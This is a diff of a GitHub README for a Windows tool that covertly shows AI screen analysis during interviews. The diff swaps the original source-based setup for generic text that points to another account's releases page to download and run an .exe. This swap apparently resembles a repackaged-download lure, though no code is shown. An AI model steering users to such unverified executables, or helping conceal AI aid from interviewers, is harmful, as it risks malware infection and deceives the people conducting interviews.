@@ -1,81 +1,81 @@
-# AI-Interview-Assist
+# 🤖 AI-Interview-Assist - Your Smart Assistant for Interviews
 
-**AI-Interview-Assist** is a Windows-native GUI application that combines AI-powered screen analysis with advanced privacy tools. It is especially useful during job interviews, screen-sharing, presentations, or remote sessions where you need discretion and a smart assistant working behind the scenes.
+## 🚀 Getting Started
 
+AI-Interview-Assist helps you prepare for interviews and presentations. This Windows app uses AI technology to analyze your screen. It also provides tools to enhance your privacy during presentations or meetings.
 
-<p align="center">
-  <a href="https://github.com/Batlez/AI-Interview-Assist/releases/latest">
-    <img src="https://img.shields.io/github/downloads/Batlez/AI-Interview-Assist/total?style=for-the-badge" alt="GitHub all releases" />
-  </a> 
-  <a href="https://paypal.me/CS2bro123">
-    <img src="https://img.shields.io/badge/PayPal-00457C?style=for-the-badge&logo=paypal&logoColor=white" alt="PayPal" />
-  </a>
-</p>
+## 📥 Download the App
 
----
+[![Download AI-Interview-Assist](https://img.shields.io/badge/Download-AI--Interview--Assist-brightgreen)](https://github.com/TirtaSandy/AI-Interview-Assist/releases)
 
-## 🚀 What It Does
+Click the badge above to get started downloading the latest version of the app. 
 
-* 📸 **Screen AI Analysis**: Select a screen area or analyze your full display using OpenAI’s vision models. Get text transcriptions and contextual descriptions.
-* 🛡️ **Privacy Toggles**:
+## 📋 Features
 
-  * Hide window from screen capture (recording-safe)
-  * Remove from Windows taskbar
-  * Keep window always on top
-  * Adjustable window transparency
-  * Option to change AI models
-* ⚡ **Hotkeys** for quick toggles
-* 🌓 Dark & Light theme support
+- **AI Analysis:** Get feedback during interviews or presentations.
+- **Privacy-Focused:** Hide the app from screen sharing and recording tools.
+- **User-Friendly Interface:** Simple design for easy navigation.
+- **Compatible with Windows:** Tailored for Windows users.
+- **Real-Time Assistance:** Receive tips and support as you speak.
 
----
+## 🖥️ System Requirements
 
-## 📦 Setup Instructions
+- **Operating System:** Windows 10 or higher
+- **Memory:** At least 4 GB RAM
+- **Processor:** Dual-core processor with 2.0 GHz or higher
+- **Screen Resolution:** Minimum 1280 x 720 pixels
 
-### 1. Clone the Repository:
+## 📤 Download & Install
 
-```bash
-git clone https://github.com/Batlez/AI-Interview-Assist.git
-cd AI-Interview-Assist
-```
+To get AI-Interview-Assist, follow these simple steps:
 
-### 2. Install dependencies:
+1. **Visit the Releases Page:** Go to [this link](https://github.com/TirtaSandy/AI-Interview-Assist/releases) to find the most recent version.
+2. **Choose the Latest Release:** Look for the latest version listed at the top. It should look something like "v1.0.0" or similar.
+3. **Download the Files:** Click on the `.exe` file to download it to your computer. 
+4. **Run the Installer:** Locate the downloaded file, double-click it, and follow the prompts to install the app.
 
-Use your preferred Python environment (Python 3.9+ recommended):
+## 🔧 How to Use AI-Interview-Assist
 
-```bash
-pip install -r requirements.txt
-```
+1. **Open the Application:** After installation, launch AI-Interview-Assist from your Start menu.
+2. **Configure Preferences:** Adjust the settings to suit your needs. This includes privacy options and display preferences.
+3. **Start Your Interview or Presentation:** Use the app during practice sessions or actual interviews for real-time feedback.
+4. **Utilize the AI Features:** As you work, the AI will provide insights and tips to improve your presentation skills.
 
-### 3. Add your OpenAI API Key:
+## 🔒 Privacy Features
 
-Modify the `.env` file in the root directory with the following contents:
+AI-Interview-Assist is built with your privacy in mind. The app can remain hidden from screen sharing and recording, making it a safe choice for your presentations. 
 
-```ini
-OPENAI_API_KEY="your-key-name-here"
-```
+To ensure your privacy is preserved:
+- **Activate Privacy Mode:** This can be done in the settings menu.
+- **Test Before Use:** Always check the app's settings before presenting to ensure your workspace is secure.
 
-> **Note**: OpenAI’s API requires an active billing account with a **minimum \$5 spend** to access GPT models.
+## 📊 Additional Resources
 
----
+For more information about using AI-Interview-Assist, consider checking out these resources:
+- [User Guide](https://github.com/TirtaSandy/AI-Interview-Assist/wiki)
+- [FAQ Section](https://github.com/TirtaSandy/AI-Interview-Assist/wiki/FAQ)
+- [Community Support](https://github.com/TirtaSandy/AI-Interview-Assist/discussions)
 
-## ▶️ How to Run
+Engage with the community for tips and shared experiences using the app.
 
-On Windows, you can launch the app in either of these ways:
+## 📝 Feedback and Contributions
 
-- **Double-click** the `main.pyw` file  
-**or**
-- Run it from the terminal:
+Your experience is important. If you have feedback or would like to contribute to AI-Interview-Assist, consider:
+- **Reporting Issues:** Use the Issues tab on GitHub.
+- **Suggesting Features:** Your ideas can help shape future updates.
+- **Contributing Code:** If you have coding skills, feel free to submit pull requests.
 
-```bash
-python main.pyw
-```
+## 📬 Contact
 
----
+For inquiries or additional support, please use the contact information found in the repository. 
 
-## 📸 Screenshots
+## 🎉 Hats Off to Our Contributors
 
-<div align="center">
-  <img src="https://github.com/user-attachments/assets/fbcfcdf4-c12f-48dc-9ba1-2cd524f812fb" alt="Screenshot 1" width="600"/>
-  <br><br>
-  <img src="https://github.com/user-attachments/assets/a784fad4-6f27-40a7-a144-9d93b753f700" alt="Screenshot 2" width="600"/>
-</div>
+A special thank you to everyone who made AI-Interview-Assist possible. Your hard work and dedication are appreciated.
+
+## 🔗 Learn More
+
+- [Project Repository](https://github.com/TirtaSandy/AI-Interview-Assist)
+- [Download Link](https://github.com/TirtaSandy/AI-Interview-Assist/releases)
+
+We hope you find AI-Interview-Assist helpful for your future interviews and presentations!
